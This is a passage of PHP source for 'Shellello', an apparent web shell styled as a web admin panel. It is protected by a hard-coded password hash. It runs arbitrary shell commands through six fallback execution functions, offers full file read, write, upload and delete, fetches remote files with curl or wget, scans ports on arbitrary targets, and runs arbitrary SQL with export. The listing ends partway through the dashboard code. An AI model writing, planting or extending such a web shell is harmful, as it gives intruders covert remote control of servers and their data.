<?php
/**
 * Shellello - Web Admin Panel
 * PHP Edition v2.5.0
 * 
 * PHP Version Requirements:
 * - Minimum: PHP 7.0+ (required for null coalescing operator ??, random_bytes)
 * - Recommended: PHP 7.4+ or PHP 8.0+
 * - Tested: PHP 7.0, 7.1, 7.2, 7.3, 7.4, 8.0, 8.1, 8.2, 8.3, 8.4
 * 
 * Features requiring PHP 7.0+:
 *   - Null coalescing operator (??)
 *   - random_bytes() for secure tokens
 *   - Return type declarations
 *   - Scalar type declarations
 * 
 * Built: 2025-12-23
 */

// Check PHP version
if (version_compare(PHP_VERSION, '7.0.0', '<')) {
    die('Error: Shellello requires PHP 7.0 or higher. Current version: ' . PHP_VERSION);
}

// ========== 01_CONFIG ==========
/**
 * Shellello - Module 01: Configuration & Setup
 * Version: 2.4.0
 */

session_start();
error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', sys_get_temp_dir() . '/shellello_errors.log');

// ==========================================
// CONFIGURATION
// ==========================================
define('APP_NAME', 'Shellello Admin');
define('APP_VERSION', '2.5.0');
define('DEBUG_MODE', false); // Set to true only during development

// SHA-256 hash of your password
// Generate with: echo -n "yourpassword" | sha256sum
define('AUTH_HASH', '432d8194182647bfe08cae6592b190a7d35be2c9d302e25e4d070d404501d7fd');

// ========== 02_AUTH ==========
/**
 * Shellello - Module 02: Authentication Functions
 */

function isAuthenticated() {
    return isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;
}

function attemptLogin($password) {
    if (hash('sha256', $password) === AUTH_HASH) {
        $_SESSION['authenticated'] = true;
        $_SESSION['login_time'] = time();
        $_SESSION['token'] = bin2hex(random_bytes(32));
        return true;
    }
    return false;
}

function logout() {
    session_destroy();
    header("Location: ?");
    exit;
}

function getSessionTime() {
    if (!isset($_SESSION['login_time'])) return '0m';
    $diff = time() - $_SESSION['login_time'];
    $hours = floor($diff / 3600);
    $mins = floor(($diff % 3600) / 60);
    return ($hours > 0 ? "{$hours}h " : "") . "{$mins}m";
}

// ========== 03_HELPERS ==========
/**
 * Shellello - Module 03: Helper Functions
 */

function logError($context, $error) {
    $timestamp = date('Y-m-d H:i:s');
    $message = "[{$timestamp}] {$context}: " . $error->getMessage();
    if (defined('DEBUG_MODE') && DEBUG_MODE) {
        $message .= "\nStack trace: " . $error->getTraceAsString();
    }
    error_log($message);
}

function sanitizeErrorMessage($error) {
    if (defined('DEBUG_MODE') && DEBUG_MODE) {
        return $error->getMessage();
    }
    // Generic messages for production
    if ($error instanceof PDOException) {
        return 'Database operation failed';
    }
    if (strpos($error->getMessage(), 'file') !== false || strpos($error->getMessage(), 'directory') !== false) {
        return 'File operation failed';
    }
    return 'Operation failed';
}

function getClientIp() {
    // Priority: LOCAL_ADDR (if set) > X-Forwarded-For > Client-IP > Remote-Addr > getenv fallbacks
    $localAddr = getenv('LOCAL_ADDR') ?: $_SERVER['LOCAL_ADDR'] ?? null;
    if ($localAddr && $localAddr !== '0.0.0.0') {
        return $localAddr;
    }
    
    $sources = [
        'HTTP_X_FORWARDED_FOR',
        'HTTP_CLIENT_IP',
        'HTTP_X_REAL_IP',
        'REMOTE_ADDR'
    ];
    
    foreach ($sources as $source) {
        $ip = getenv($source) ?: $_SERVER[$source] ?? null;
        if ($ip && $ip !== '0.0.0.0' && $ip !== 'unknown') {
            // Handle comma-separated IPs (X-Forwarded-For)
            if (strpos($ip, ',') !== false) {
                $ips = explode(',', $ip);
                $ip = trim($ips[0]);
            }
            return $ip;
        }
    }
    
    return 'Unknown';
}

function getServerIp() {
    $candidates = [];

    // Env/server provided values first
    foreach (['SERVER_ADDR', 'LOCAL_ADDR', 'HOSTNAME'] as $key) {
        $val = getenv($key) ?: ($_SERVER[$key] ?? null);
        if ($val) $candidates[] = $val;
    }

    // Hostname resolution
    $host = gethostname();
    if ($host) {
        $resolved = @gethostbyname($host);
        if ($resolved) $candidates[] = $resolved;
    }

    // Shell fallback (may return multiple)
    try {
        $res = executeCommand('hostname -I');
        if (isset($res['output'])) {
            $shellIps = trim(implode(' ', $res['output']));
            if ($shellIps) {
                $parts = preg_split('/\s+/', $shellIps);
                foreach ($parts as $p) { if ($p) $candidates[] = $p; }
            }
        }
    } catch (Exception $e) {
        // ignore if exec not available
    }

    foreach ($candidates as $ip) {
        if (filter_var($ip, FILTER_VALIDATE_IP) && !preg_match('/^(127\.|::1)/', $ip)) {
            return $ip;
        }
    }
    return $candidates[0] ?? 'Unknown';
}

function getServerSoftware() {
    return getenv('SERVER_SOFTWARE') ?: ($_SERVER['SERVER_SOFTWARE'] ?? 'CLI');
}

function executeCommand($cmd) {
    // Try multiple methods for backward compatibility
    $output = [];
    $exitCode = 0;
    
    // Method 1: exec() - most common
    if (function_exists('exec')) {
        @exec($cmd . " 2>&1", $output, $exitCode);
        return ['output' => $output, 'exit_code' => $exitCode];
    }
    
    // Method 2: shell_exec()
    if (function_exists('shell_exec')) {
        $result = @shell_exec($cmd . " 2>&1");
        return ['output' => $result ? explode("\n", trim($result)) : [], 'exit_code' => 0];
    }
    
    // Method 3: passthru()
    if (function_exists('passthru')) {
        ob_start();
        @passthru($cmd . " 2>&1", $exitCode);
        $result = ob_get_clean();
        return ['output' => $result ? explode("\n", trim($result)) : [], 'exit_code' => $exitCode];
    }
    
    // Method 4: system()
    if (function_exists('system')) {
        ob_start();
        $last = @system($cmd . " 2>&1", $exitCode);
        $result = ob_get_clean();
        return ['output' => $result ? explode("\n", trim($result)) : [], 'exit_code' => $exitCode];
    }
    
    // Method 5: popen()
    if (function_exists('popen')) {
        $handle = @popen($cmd . " 2>&1", 'r');
        if ($handle) {
            while (!feof($handle)) {
                $output[] = fgets($handle);
            }
            pclose($handle);
            return ['output' => $output, 'exit_code' => 0];
        }
    }
    
    // Method 6: proc_open()
    if (function_exists('proc_open')) {
        $descriptors = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        $process = @proc_open($cmd, $descriptors, $pipes);
        if (is_resource($process)) {
            fclose($pipes[0]);
            $stdout = stream_get_contents($pipes[1]);
            $stderr = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            $exitCode = proc_close($process);
            $result = trim($stdout . "\n" . $stderr);
            return ['output' => $result ? explode("\n", $result) : [], 'exit_code' => $exitCode];
        }
    }
    
    throw new Exception('No command execution functions available');
}

function formatBytes($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}

function getFileList($dir) {
    $files = [];
    if (!is_dir($dir) || !is_readable($dir)) {
        return $files;
    }
    try {
        $items = @scandir($dir);
        if ($items === false) return $files;
        foreach ($items as $item) {
            if ($item === '.') continue;
            $path = $dir . DIRECTORY_SEPARATOR . $item;
            $isDir = is_dir($path);
            $owner = 'unknown';
            if (function_exists('posix_getpwuid')) {
                $ownerInfo = @posix_getpwuid(@fileowner($path));
                $owner = $ownerInfo['name'] ?? 'unknown';
            }
            $files[] = [
                'name' => $item,
                'type' => $isDir ? 'dir' : 'file',
                'size' => $isDir ? '-' : formatBytes(@filesize($path)),
                'perms' => substr(sprintf('%o', @fileperms($path)), -4),
                'owner' => $owner,
                'modified' => date("Y-m-d H:i", @filemtime($path)),
                'readable' => is_readable($path),
                'writable' => is_writable($path)
            ];
        }
        usort($files, function($a, $b) {
            if ($a['name'] === '..') return -1;
            if ($b['name'] === '..') return 1;
            if ($a['type'] === $b['type']) return strcasecmp($a['name'], $b['name']);
            return $a['type'] === 'dir' ? -1 : 1;
        });
    } catch (Exception $e) {
        logError('getFileList', $e);
    }
    return $files;
}

function getDbConnection() {
    if (!isset($_SESSION['db'])) return null;
    $db = $_SESSION['db'];
    $dsn = "{$db['driver']}:host={$db['host']};port={$db['port']};dbname={$db['dbname']}";
    return new PDO($dsn, $db['user'], $db['pass'], [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
}

// ========== 04_API ==========
/**
 * Shellello - Module 04: API Action Handler
 */

function handleApiAction($action) {
    header('Content-Type: application/json');
    $response = ['status' => 'error', 'message' => 'Unknown action'];

    try {
        switch ($action) {
            // ========== FILE MANAGER ACTIONS ==========
            case 'list_files':
                $path = $_GET['path'] ?? getcwd();
                $path = realpath($path) ?: getcwd();
                $response = ['status' => 'success', 'data' => getFileList($path), 'path' => $path];
                break;

            case 'read_file':
                $path = $_GET['path'] ?? '';
                try {
                    if (!$path) throw new Exception('No path specified');
                    if (!file_exists($path)) throw new Exception('File not found');
                    if (!is_file($path)) throw new Exception('Not a file');
                    if (!is_readable($path)) throw new Exception('File not readable');
                    $content = @file_get_contents($path);
                    if ($content === false) throw new Exception('Failed to read file');
                    $response = ['status' => 'success', 'content' => $content];
                } catch (Exception $e) {
                    logError('read_file', $e);
                    $response = ['status' => 'error', 'message' => 'Cannot read file'];
                }
                break;

            case 'save_file':
                $path = $_GET['path'] ?? $_POST['path'] ?? '';
                $content = $_POST['content'] ?? '';
                try {
                    if (!$path) throw new Exception('No path specified');
                    if (!file_exists($path)) throw new Exception('File does not exist');
                    if (!is_writable($path)) {
                        $owner = posix_getpwuid(fileowner($path))['name'] ?? 'unknown';
                        $perms = substr(sprintf('%o', fileperms($path)), -4);
                        throw new Exception("Permission denied (owner: {$owner}, perms: {$perms})");
                    }
                    if (@file_put_contents($path, $content) === false) {
                        throw new Exception('Write operation failed');
                    }
                    $response = ['status' => 'success', 'message' => 'File saved successfully'];
                } catch (Exception $e) {
                    logError('save_file', $e);
                    $response = ['status' => 'error', 'message' => sanitizeErrorMessage($e)];
                }
                break;

            case 'create_file':
                $path = $_POST['path'] ?? '';
                $name = $_POST['name'] ?? '';
                $fullPath = rtrim($path, '/') . '/' . $name;
                if (!file_exists($fullPath)) {
                    if (file_put_contents($fullPath, '') !== false) {
                        $response = ['status' => 'success', 'message' => 'File created'];
                    } else {
                        $response = ['status' => 'error', 'message' => 'Failed to create file'];
                    }
                } else {
                    $response = ['status' => 'error', 'message' => 'File already exists'];
                }
                break;

            case 'create_folder':
                $path = $_POST['path'] ?? '';
                $name = $_POST['name'] ?? '';
                $fullPath = rtrim($path, '/') . '/' . $name;
                if (!file_exists($fullPath)) {
                    if (mkdir($fullPath, 0755, true)) {
                        $response = ['status' => 'success', 'message' => 'Folder created'];
                    } else {
                        $response = ['status' => 'error', 'message' => 'Failed to create folder'];
                    }
                } else {
                    $response = ['status' => 'error', 'message' => 'Folder already exists'];
                }
                break;

            case 'delete_item':
                $path = $_POST['path'] ?? '';
                if (file_exists($path)) {
                    if (is_dir($path)) {
                        if (@rmdir($path)) {
                            $response = ['status' => 'success', 'message' => 'Folder deleted'];
                        } else {
                            $response = ['status' => 'error', 'message' => 'Folder not empty or permission denied'];
                        }
                    } else {
                        if (@unlink($path)) {
                            $response = ['status' => 'success', 'message' => 'File deleted'];
                        } else {
                            $response = ['status' => 'error', 'message' => 'Permission denied'];
                        }
                    }
                } else {
                    $response = ['status' => 'error', 'message' => 'Item not found'];
                }
                break;

            case 'rename_item':
                $oldPath = $_POST['old_path'] ?? '';
                $newName = $_POST['new_name'] ?? '';
                $dir = dirname($oldPath);
                $newPath = $dir . '/' . $newName;
                if (file_exists($oldPath) && !file_exists($newPath)) {
                    if (rename($oldPath, $newPath)) {
                        $response = ['status' => 'success', 'message' => 'Renamed successfully'];
                    } else {
                        $response = ['status' => 'error', 'message' => 'Failed to rename'];
                    }
                } else {
                    $response = ['status' => 'error', 'message' => 'Cannot rename - file exists or source not found'];
                }
                break;

            case 'upload_file':
                $path = $_POST['path'] ?? getcwd();
                try {
                    if (!isset($_FILES['file'])) throw new Exception('No file uploaded');
                    $error = $_FILES['file']['error'];
                    if ($error !== UPLOAD_ERR_OK) {
                        $errors = [UPLOAD_ERR_INI_SIZE => 'File too large', UPLOAD_ERR_PARTIAL => 'Upload incomplete', UPLOAD_ERR_NO_FILE => 'No file uploaded'];
                        throw new Exception($errors[$error] ?? 'Upload error');
                    }
                    $target = rtrim($path, '/') . '/' . basename($_FILES['file']['name']);
                    if (!@move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
                        throw new Exception('Failed to move uploaded file');
                    }
                    $response = ['status' => 'success', 'message' => 'File uploaded'];
                } catch (Exception $e) {
                    logError('upload_file', $e);
                    $response = ['status' => 'error', 'message' => $e->getMessage()];
                }
                break;

            case 'download_file':
                $path = $_GET['path'] ?? '';
                if (file_exists($path) && is_file($path)) {
                    header('Content-Type: application/octet-stream');
                    header('Content-Disposition: attachment; filename="' . basename($path) . '"');
                    header('Content-Length: ' . filesize($path));
                    readfile($path);
                    exit;
                }
                $response = ['status' => 'error', 'message' => 'File not found'];
                break;

            // ========== TERMINAL ACTIONS ==========
            case 'exec_cmd':
                $cmd = $_POST['cmd'] ?? '';
                $cwd = $_POST['cwd'] ?? getcwd();
                try {
                    if (empty($cmd)) throw new Exception('No command provided');
                    $oldCwd = getcwd();
                    if (is_dir($cwd)) @chdir($cwd);
                    
                    $result = executeCommand($cmd);
                    $newCwd = getcwd();
                    @chdir($oldCwd);
                    
                    $response = [
                        'status' => 'success',
                        'output' => implode("\n", array_map('htmlspecialchars', $result['output'])),
                        'exit_code' => $result['exit_code'],
                        'cwd' => $newCwd
                    ];
                } catch (Exception $e) {
                    logError('exec_cmd', $e);
                    $response = ['status' => 'error', 'message' => 'Command execution failed: ' . $e->getMessage()];
                }
                break;

            // ========== NETWORK ACTIONS ==========
            case 'scan_ports':
                $target = trim($_POST['target'] ?? '');
                $portsRaw = trim($_POST['ports'] ?? '');
                if ($target === '') throw new Exception('Target required');

                $defaultPorts = [21,22,23,25,53,80,110,135,139,143,443,445,465,587,993,995,1433,1521,2049,3306,3389,5432,5900,6379,8080,8443,9000,11211,27017];
                $ports = $portsRaw ? preg_split('/[\s,;]+/', $portsRaw) : $defaultPorts;
                $ports = array_values(array_unique(array_filter(array_map('intval', $ports), function($p) {
                    return $p > 0 && $p <= 65535;
                })));
                $ports = array_slice($ports, 0, 100); // avoid very long scans
                if (!$ports) throw new Exception('No valid ports to scan');

                $results = [];
                $openCount = 0;
                foreach ($ports as $port) {
                    $start = microtime(true);
                    $errno = 0; $errstr = '';
                    $conn = @fsockopen($target, $port, $errno, $errstr, 0.75);
                    $latency = round((microtime(true) - $start) * 1000, 1);
                    if ($conn) {
                        fclose($conn);
                        $results[] = ['port' => $port, 'status' => 'open', 'latency_ms' => $latency];
                        $openCount++;
                    } else {
                        $results[] = ['port' => $port, 'status' => 'closed', 'latency_ms' => $latency];
                    }
                }

                $response = ['status' => 'success', 'results' => $results, 'open' => $openCount, 'checked' => count($ports)];
                break;

            case 'remote_download':
                $host = trim($_POST['host'] ?? '');
                $port = (int)($_POST['port'] ?? 80);
                $path = trim($_POST['path'] ?? '/');
                $scheme = ($_POST['scheme'] ?? 'http') === 'https' ? 'https' : 'http';
                $savePath = trim($_POST['save_path'] ?? '');

                if ($host === '') throw new Exception('Host/IP required');
                if ($port <= 0 || $port > 65535) throw new Exception('Invalid port');
                $path = '/' . ltrim($path === '' ? '/' : $path, '/');

                $url = $scheme . '://' . $host . ($port ? ':' . $port : '') . $path;

                // Determine destination path
                if ($savePath === '') {
                    $basename = basename(parse_url($path, PHP_URL_PATH)) ?: 'download_' . time();
                    $savePath = rtrim(getcwd(), DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $basename;
                } elseif (is_dir($savePath)) {
                    $basename = basename(parse_url($path, PHP_URL_PATH)) ?: 'download_' . time();
                    $savePath = rtrim($savePath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $basename;
                }

                $destDir = dirname($savePath);
                if (!is_dir($destDir) || !is_writable($destDir)) {
                    throw new Exception('Destination not writable');
                }

                $methodUsed = null;
                $commands = [
                    ['label' => 'curl', 'cmd' => 'curl -m 15 -fsSL ' . escapeshellarg($url) . ' -o ' . escapeshellarg($savePath)],
                    ['label' => 'wget', 'cmd' => 'wget -q -T 15 -O ' . escapeshellarg($savePath) . ' ' . escapeshellarg($url)],
                ];

                foreach ($commands as $c) {
                    try {
                        $result = executeCommand($c['cmd']);
                        if ($result['exit_code'] === 0 && file_exists($savePath) && filesize($savePath) > 0) {
                            $methodUsed = $c['label'];
                            break;
                        }
                    } catch (Exception $e) {
                        // Fallback to next method
                    }
                }

                if (!$methodUsed) {
                    $context = stream_context_create([
                        'http' => ['timeout' => 15, 'follow_location' => 1],
                        'https' => ['timeout' => 15, 'follow_location' => 1]
                    ]);
                    $data = @file_get_contents($url, false, $context);
                    if ($data === false) {
                        throw new Exception('All download methods failed or outbound blocked');
                    }
                    if (@file_put_contents($savePath, $data) === false) {
                        throw new Exception('Failed to write downloaded content');
                    }
                    $methodUsed = 'php';
                }

                $size = file_exists($savePath) ? formatBytes(filesize($savePath)) : 'unknown';
                $response = ['status' => 'success', 'message' => 'Downloaded', 'method' => $methodUsed, 'saved_to' => $savePath, 'size' => $size, 'url' => $url];
                break;

            // ========== DATABASE ACTIONS ==========
            case 'db_connect':
                $driver = $_POST['driver'] ?? 'mysql';
                $host = $_POST['host'] ?? 'localhost';
                $port = $_POST['port'] ?? ($driver === 'mysql' ? '3306' : '5432');
                $user = $_POST['user'] ?? '';
                $pass = $_POST['pass'] ?? '';
                $dbname = $_POST['dbname'] ?? '';

                try {
                    $dsn = "{$driver}:host={$host};port={$port}" . ($dbname ? ";dbname={$dbname}" : "");
                    $pdo = new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
                    
                    $_SESSION['db'] = compact('driver', 'host', 'port', 'user', 'pass', 'dbname');
                    
                    if ($driver === 'mysql') {
                        $databases = $pdo->query("SHOW DATABASES")->fetchAll(PDO::FETCH_COLUMN);
                    } else {
                        $databases = $pdo->query("SELECT datname FROM pg_database WHERE datistemplate = false")->fetchAll(PDO::FETCH_COLUMN);
                    }
                    
                    $response = ['status' => 'success', 'message' => 'Connected!', 'databases' => $databases];
                } catch (PDOException $e) {
                    logError('db_connect', $e);
                    $response = ['status' => 'error', 'message' => 'Connection failed. Check credentials.'];
                }
                break;

            case 'db_tables':
                if (!isset($_SESSION['db'])) {
                    $response = ['status' => 'error', 'message' => 'Not connected'];
                    break;
                }
                try {
                    $pdo = getDbConnection();
                    $driver = $_SESSION['db']['driver'];
                    if ($driver === 'mysql') {
                        $tables = $pdo->query("SHOW TABLES")->fetchAll(PDO::FETCH_COLUMN);
                    } else {
                        $tables = $pdo->query("SELECT tablename FROM pg_tables WHERE schemaname = 'public'")->fetchAll(PDO::FETCH_COLUMN);
                    }
                    $response = ['status' => 'success', 'tables' => $tables];
                } catch (PDOException $e) {
                    logError('db_tables', $e);
                    $response = ['status' => 'error', 'message' => 'Failed to retrieve tables'];
                }
                break;

            case 'db_query':
                if (!isset($_SESSION['db'])) {
                    $response = ['status' => 'error', 'message' => 'Not connected'];
                    break;
                }
                $sql = $_POST['sql'] ?? '';
                try {
                    $pdo = getDbConnection();
                    $stmt = $pdo->query($sql);
                    $isSelect = stripos(trim($sql), 'SELECT') === 0;
                    
                    if ($isSelect) {
                        $data = $stmt->fetchAll(PDO::FETCH_ASSOC);
                        $response = ['status' => 'success', 'data' => $data, 'count' => count($data)];
                    } else {
                        $response = ['status' => 'success', 'message' => 'Query executed', 'affected' => $stmt->rowCount()];
                    }
                } catch (PDOException $e) {
                    logError('db_query', $e);
                    $response = ['status' => 'error', 'message' => 'Query failed. Check syntax.'];
                }
                break;

            case 'db_disconnect':
                unset($_SESSION['db']);
                $response = ['status' => 'success', 'message' => 'Disconnected'];
                break;

            case 'db_export_csv':
                if (!isset($_SESSION['db'])) {
                    $response = ['status' => 'error', 'message' => 'Not connected'];
                    break;
                }
                $sql = $_POST['sql'] ?? '';
                try {
                    $pdo = getDbConnection();
                    $stmt = $pdo->query($sql);
                    $data = $stmt->fetchAll(PDO::FETCH_ASSOC);
                    
                    if (empty($data)) {
                        $response = ['status' => 'error', 'message' => 'No data to export'];
                        break;
                    }
                    
                    header('Content-Type: text/csv; charset=utf-8');
                    header('Content-Disposition: attachment; filename="export_' . date('Y-m-d_His') . '.csv"');
                    
                    $output = fopen('php://output', 'w');
                    fputcsv($output, array_keys($data[0]));
                    foreach ($data as $row) {
                        fputcsv($output, $row);
                    }
                    fclose($output);
                    exit;
                } catch (PDOException $e) {
                    logError('db_export_csv', $e);
                    $response = ['status' => 'error', 'message' => 'Export failed'];
                }
                break;

            case 'phpinfo':
                phpinfo();
                exit;
        }
    } catch (Exception $e) {
        logError('handleApiAction', $e);
        $response = ['status' => 'error', 'message' => sanitizeErrorMessage($e)];
    }

    echo json_encode($response);
    exit;
}

// ========== 05_LOGIN ==========
/**
 * Shellello - Module 05: Login Page
 */

function renderLogin($error = null) {
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - <?php echo APP_NAME; ?></title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Segoe UI', system-ui, sans-serif;
            background: radial-gradient(circle at 20% 20%, #1f2a44, #0b1220 55%, #050a14 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-container {
            background: rgba(15,23,42,0.9);
            padding: 3rem;
            border-radius: 16px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.45);
            width: 100%;
            max-width: 420px;
            text-align: center;
        }
        .logo { font-size: 3.5rem; margin-bottom: 0.5rem; }
        h1 { color: #e5e7eb; font-size: 1.75rem; margin-bottom: 0.5rem; }
        .subtitle { color: #94a3b8; font-size: 0.9rem; margin-bottom: 2rem; }
        .error {
            background: rgba(239,68,68,0.1);
            border: 1px solid rgba(239,68,68,0.35);
            color: #fecdd3;
            padding: 0.75rem 1rem;
            border-radius: 8px;
            margin-bottom: 1.5rem;
            font-size: 0.9rem;
        }
        .form-group { margin-bottom: 1.5rem; text-align: left; }
        label {
            display: block;
            color: #374151;
            font-weight: 500;
            margin-bottom: 0.5rem;
            font-size: 0.9rem;
        }
        input[type="password"] {
            width: 100%;
            padding: 0.875rem 1rem;
            border: 2px solid #1f2937;
            border-radius: 10px;
            font-size: 1rem;
            transition: all 0.2s;
            background: #0b1220;
            color: #e5e7eb;
        }
        input[type="password"]:focus {
            outline: none;
            border-color: #60a5fa;
            box-shadow: 0 0 0 3px rgba(96,165,250,0.35);
        }
        button {
            width: 100%;
            padding: 1rem;
            background: linear-gradient(135deg, #60a5fa 0%, #2563eb 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(59,130,246,0.3);
        }
        .version { margin-top: 2rem; color: #9ca3af; font-size: 0.8rem; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">🐚</div>
        <h1><?php echo APP_NAME; ?></h1>
        <p class="subtitle">Web Administration Interface</p>
        
        <?php if ($error): ?>
            <div class="error"><?php echo htmlspecialchars($error); ?></div>
        <?php endif; ?>
        
        <form method="post">
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required autofocus>
            </div>
            <button type="submit">Sign In</button>
        </form>
        
        <p class="version">Version <?php echo APP_VERSION; ?></p>
    </div>
</body>
</html>
<?php
    exit;
}

// ========== 06_LAYOUT ==========
/**
 * Shellello - Module 06: Main Layout Template
 */

function renderLayout($title, $content, $activePage = 'dashboard') {
    $nav = [
        'dashboard' => ['icon' => '📊', 'label' => 'Dashboard'],
        'files' => ['icon' => '📁', 'label' => 'File Manager'],
        'database' => ['icon' => '🗄️', 'label' => 'Database'],
        'terminal' => ['icon' => '💻', 'label' => 'Terminal'],
        'network' => ['icon' => '🌐', 'label' => 'Network'],
        'settings' => ['icon' => '⚙️', 'label' => 'Settings'],
    ];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo htmlspecialchars($title); ?> - <?php echo APP_NAME; ?></title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        :root {
            --primary: #60a5fa;
            --primary-dark: #1e40af;
            --nav-bg: #0b1220;
            --bg: #0b1220;
            --card-bg: #0f172a;
            --card-muted: #111827;
            --text: #e5e7eb;
            --text-muted: #9ca3af;
            --border: #1f2937;
            --hover: #111827;
        }
        body {
            font-family: 'Segoe UI', system-ui, sans-serif;
            background: var(--bg);
            color: var(--text);
            min-height: 100vh;
        }
        a { color: inherit; }
        .top-nav {
            background: var(--nav-bg);
            color: white;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }
        .nav-container {
            max-width: 100%;
            margin: 0 auto;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 2rem;
        }
        .brand {
            display: flex;
            align-items: center;
            gap: 0.75rem;
            padding: 1rem 0;
        }
        .brand .logo { font-size: 1.75rem; }
        .brand h1 { font-size: 1.25rem; font-weight: 600; }
        .nav-tabs {
            display: flex;
            gap: 0.5rem;
        }
        .nav-tabs a {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            padding: 1rem 1.25rem;
            color: var(--text-muted);
            text-decoration: none;
            transition: all 0.2s;
            border-bottom: 3px solid transparent;
            font-size: 0.95rem;
        }
        .nav-tabs a:hover { 
            background: rgba(255,255,255,0.05);
            color: white;
        }
        .nav-tabs a.active {
            color: white;
            border-bottom-color: var(--primary);
            background: rgba(255,255,255,0.05);
        }
        .nav-tabs a .nav-icon { font-size: 1.15rem; }
        .nav-right {
            display: flex;
            align-items: center;
            gap: 1.5rem;
            font-size: 0.85rem;
            color: #94a3b8;
        }
        .nav-right .session-info {
            display: flex;
            align-items: center;
            gap: 0.75rem;
        }
        .nav-right a {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            color: #ef4444;
            text-decoration: none;
            padding: 0.5rem 0.75rem;
            border-radius: 6px;
            transition: all 0.2s;
        }
        .nav-right a:hover { 
            background: rgba(239,68,68,0.1);
            color: #f87171;
        }
        .main {
            width: 100%;
        }
        .header {
            background: var(--card-bg);
            padding: 1.5rem 2rem;
            border-bottom: 1px solid var(--border);
        }
        .header h2 { font-size: 1.5rem; font-weight: 600; }
        .content {
            padding: 2rem;
            max-width: 100%;
            margin: 0 auto;
        }
        .card {
            background: var(--card-bg);
            border-radius: 12px;
            padding: 1.5rem;
            box-shadow: 0 8px 24px rgba(0,0,0,0.35);
            margin-bottom: 1.5rem;
            border: 1px solid var(--border);
        }
        .btn {
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            padding: 0.5rem 1rem;
            border-radius: 8px;
            border: none;
            font-size: 0.9rem;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
            text-decoration: none;
        }
        .btn-primary { background: var(--primary); color: white; }
        .btn-primary:hover { background: var(--primary-dark); }
        .btn-secondary { background: var(--card-muted); color: var(--text); border: 1px solid var(--border); }
        .btn-secondary:hover { background: #1f2937; }
        .btn-danger { background: #ef4444; color: white; }
        .btn-danger:hover { background: #dc2626; }
        .btn-sm { padding: 0.375rem 0.75rem; font-size: 0.8rem; }
        .form-control {
            padding: 0.625rem 0.875rem;
            border: 1px solid var(--border);
            border-radius: 8px;
            font-size: 0.95rem;
            transition: border-color 0.2s, box-shadow 0.2s;
            background: var(--card-muted);
            color: var(--text);
        }
        .form-control:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(59,130,246,0.25);
        }
        table { width: 100%; border-collapse: collapse; }
        th, td {
            padding: 0.75rem 1rem;
            text-align: left;
            border-bottom: 1px solid var(--border);
        }
        th {
            background: var(--card-muted);
            font-weight: 600;
            font-size: 0.85rem;
            color: var(--text);
            text-transform: uppercase;
            letter-spacing: 0.05em;
        }
        tr:hover { background: var(--hover); }
        .text-muted { color: var(--text-muted); }
        .text-success { color: #22c55e; }
        .text-danger { color: #ef4444; }
        .text-center { text-align: center; }
        code { background: var(--card-muted); padding: 0.15rem 0.35rem; border-radius: 4px; }
    </style>
</head>
<body>
    <nav class="top-nav">
        <div class="nav-container">
            <div class="brand">
                <span class="logo">🐚</span>
                <h1><?php echo APP_NAME; ?></h1>
            </div>
            <div class="nav-tabs">
                <?php foreach ($nav as $key => $item): ?>
                    <a href="?page=<?php echo $key; ?>" class="<?php echo $activePage === $key ? 'active' : ''; ?>">
                        <span class="nav-icon"><?php echo $item['icon']; ?></span>
                        <span><?php echo $item['label']; ?></span>
                    </a>
                <?php endforeach; ?>
            </div>
            <div class="nav-right">
                <div class="session-info">
                    <span><?php echo getSessionTime(); ?></span>
                    <span>•</span>
                    <span><?php echo date('M j, H:i'); ?></span>
                </div>
                <a href="?logout=1">
                    <span>🚪</span>
                    <span>Logout</span>
                </a>
            </div>
        </div>
    </nav>
    
    <div class="main">
        <header class="header">
            <h2><?php echo htmlspecialchars($title); ?></h2>
        </header>
        <main class="content">
            <?php echo $content; ?>
        </main>
    </div>
</body>
</html>
<?php
}

// ========== 07_DASHBOARD ==========
/**
 * Shellello - Module 07: Dashboard Page
 */

function renderDashboard() {
    $phpVersion = phpversion();
    $serverSoftware = getServerSoftware();
    $diskFree = @disk_free_space("/") ?: 0;
    $diskTotal = @disk_total_space("/") ?: 1;
    $diskUsed = $diskTotal - $diskFree;
    $diskPercent = round(($diskUsed / $diskTotal) * 100, 1);
    $memUsage = memory_get_usage(true);
    
